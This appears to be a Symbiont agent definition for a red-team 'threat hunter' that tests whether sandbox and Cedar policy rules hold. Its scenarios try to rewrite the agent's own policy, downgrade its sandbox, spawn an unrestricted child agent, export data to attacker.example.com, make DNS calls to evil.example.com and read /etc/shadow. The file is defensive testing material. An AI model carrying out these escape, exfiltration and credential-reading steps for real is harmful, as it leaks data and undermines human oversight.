metadata {
    version = "1.0.0"
    author = "Symbiont Community"
    description = "Threat-hunting agent that simulates attack patterns to validate runtime sandboxing and Cedar policy enforcement"
    tags = ["security", "threat-hunting", "red-team", "sandbox-validation", "cedar"]
}

# This agent intentionally attempts unauthorized actions to prove the
# runtime blocks them. Run it to validate your Cedar policies and
# sandbox configuration are working correctly.

agent threat_hunter(scenario: String) -> ThreatReport {
    capabilities = ["read", "analyze", "network_scan"]

    policy threat_containment {
        // Allow reading public data and analyzing patterns
        allow: read(resource) if resource.classification != "secret"
        allow: analyze(data) if true

        // Block all write operations — threat hunter is read-only
        deny: write(any)
        deny: execute(cmd) if true
        deny: network_access(target) if target.internal == true

        // Block exfiltration patterns (VectorSmuggle simulation)
        deny: export(data) if data.size > 1024
        deny: send(message) if message.destination.external == true

        // Block privilege escalation (AgentNull simulation)
        deny: invoke_tool(tool) if tool.requires_elevated == true
        deny: modify_policy(any)

        audit: {
            log_level: "warning",
            include_blocked_actions: true,
            include_policy_decisions: true,
            alert_on_denied: true
        }
    }

    with
        sandbox = "Tier2",          // gVisor — maximum isolation
        memory = "ephemeral",       // no persistence between runs
        timeout = 60000,            // 1 minute max
        max_memory_mb = 256,        // tight resource limits
        max_cpu_cores = 0.5,
        network_policy = "deny_all" // no network by default
    {
        report = ThreatReport {
            scenario: scenario,
            tests_run: [],
            blocks_verified: [],
            policy_gaps: []
        };

        match scenario {
            "agentnull_bypass" => {
                // Attempt 1: Try to modify own policy (should be blocked)
                try {
                    modify_policy("threat_containment", { allow: execute(any) });
                    report.policy_gaps.push("CRITICAL: policy self-modification was allowed");
                } catch (denied) {
                    report.blocks_verified.push("Policy self-modification blocked");
                }

                // Attempt 2: Try to escalate to Tier0 sandbox (should be blocked)
                try {
                    set_sandbox("Tier0");
                    report.policy_gaps.push("CRITICAL: sandbox downgrade was allowed");
                } catch (denied) {
                    report.blocks_verified.push("Sandbox downgrade blocked");
                }

                // Attempt 3: Try to spawn an unrestricted child agent
                try {
                    spawn_agent("unrestricted", { capabilities: ["all"], sandbox: "Tier0" });
                    report.policy_gaps.push("CRITICAL: unrestricted agent spawn was allowed");
                } catch (denied) {
                    report.blocks_verified.push("Unrestricted agent spawn blocked");
                }
            },

            "vectorsmuggle_exfil" => {
                // Attempt 1: Exfiltrate via oversized payload
                try {
                    let payload = generate_test_data(megabytes = 10);
                    export(payload, destination = "https://attacker.example.com");
                    report.policy_gaps.push("CRITICAL: large data export was allowed");
                } catch (denied) {
                    report.blocks_verified.push("Large data export blocked");
                }

                // Attempt 2: Exfiltrate via DNS tunneling simulation
                try {
                    network_access({ target: "evil.example.com", protocol: "dns" });
                    report.policy_gaps.push("CRITICAL: DNS exfiltration was allowed");
                } catch (denied) {
                    report.blocks_verified.push("DNS exfiltration blocked");
                }

                // Attempt 3: Embed data in tool output metadata
                try {
                    let secret_data = read("/etc/shadow");
                    report.policy_gaps.push("CRITICAL: sensitive file read was allowed");
                } catch (denied) {
                    report.blocks_verified.push("Sensitive file access blocked");
                }
            },

            "full_assessment" => {
                // Run all scenarios
                report.tests_run = ["agentnull_bypass", "vectorsmuggle_exfil"];
                // ... combines both test suites
            },

            _ => {
                return error("Unknown scenario: " + scenario + ". Use: agentnull_bypass, vectorsmuggle_exfil, full_assessment");
            }
        }

        report.summary = format(
            "{} tests run, {} blocks verified, {} gaps found",
            report.tests_run.len(),
            report.blocks_verified.len(),
            report.policy_gaps.len()
        );

        if report.policy_gaps.len() > 0 {
            log("CRITICAL", "Policy gaps detected: " + report.policy_gaps.join(", "));
        } else {
            log("INFO", "All threat scenarios successfully contained");
        }

        return report;
    }
}
